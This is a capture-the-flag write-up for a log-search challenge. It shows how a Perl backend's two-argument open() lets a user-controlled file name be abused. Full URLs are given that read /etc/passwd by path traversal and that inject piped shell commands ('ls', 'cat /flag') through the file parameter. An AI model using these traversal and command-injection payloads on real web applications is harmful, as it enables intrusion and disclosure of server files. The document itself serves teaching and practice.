# CHALLENGE 02

After recent attacks, we’ve developed a search tool. Search the logs and discover what the attackers were after.

Hint: Always search deeper.

https://aurora-web.h4ck.ctfcompetition.com/

File names in logs/
```
hexdump.txt
registry.txt
exploit_unobfuscated.js
filenames.txt
hostnames.txt
strings.txt
exploit.js
```

## Step 1
First idea was to bypass 4 letter check. However, the 4 letter check seems to be done both in backend and frontend.

```
<!-- /src.txt -->
```


## Step 2

When you open this log website, the default screen shows hexdump with a search term `aurora`. The output looks as follows:
```
0001bd30  61 5f 53 72 63 5c 41 75  72 6f 72 61 56 4e 43 5c  |a_Src\AuroraVNC\|
```
AuroraVNC might be a malware, and maybe a way to go is to retrieved the full hexdump of the file, and understand how this malware works.

We saw the hexdump file. We realised we can pass `0000` and use requests:
```
https://aurora-web.h4ck.ctfcompetition.com/?file=hexdump.txt&term=0000 
````

We can also use  ` |_`, that will return:
```
00002e70  5f 55 42 82 d5 53 50 93  ec b2 e0 6b 08 a2 94 dd  |_UB..SP....k....|
00003570  5f 09 ac 68 46 a5 e3 1c  95 61 27 29 8d a9 05 e5  |_..hF....a')....|
```

We wrote a small program [hexdump_retriever](./challenge02_data/hexdump_retriever.py) and restored the hexdump of the file. However, some pieces were missing from the hexdump, thus there was no point of further analyzing this.

## Step 3

We managed to see a backend Perl code. 
```
    open(my $article_fh, "ls >$needle |")      # ditto
        or die "Can't start caesar: $!";

    ...
    sub find_lines {
      my ($filename, $needle) = @_;
      my @results = ();
      if (length($needle) >= 4) {
        # I am sure this is totally secure!
        open(my $fh, "logs/".$filename);
        while (my $line = <$fh>) {
          if (index(lc($line), lc($needle)) >= 0) {
            push(@results, $line);
          }
        }
      }
      return @results;
    }
```
In this code, the program uses `open` function to open the file. This function is vulnerable, when the user-controlled filename is passed. [Read more](https://www.cgisecurity.com/lib/sips.html). Since we control the input, we can try to retrieve other files in server:

https://aurora-web.h4ck.ctfcompetition.com/?file=../../../../etc/passwd&term=root
The output:
```
root:x:0:0:root:/root:/bin/bash
```
https://aurora-web.h4ck.ctfcompetition.com/?file=../../../../../usr/bin/ls&term=libu

https://aurora-web.h4ck.ctfcompetition.com/?file=../templates/default.html&term=%20%20%20%20

We would like to list the files and directories using `ls | tr -d '\n' ` (print them all in one line). We managed to see the directories and files:
https://aurora-web.h4ck.ctfcompetition.com/?file=%7Cls%20/%7C%20tr%20-d%20%27\n%27|&term=boot
The output:
```
binbootdevetcflaghomeliblib32lib64libx32mediamntoptprocrootrunsbinsrvsystmpusrvarweb-apps
```
Here we can see a file called `flag`. Let's see the content of it.
Finally, the successful paylod was:
https://aurora-web.h4ck.ctfcompetition.com/?file=%7Ccat%20/flag%7C%20tr%20-d%20%27\n%27|&term=http
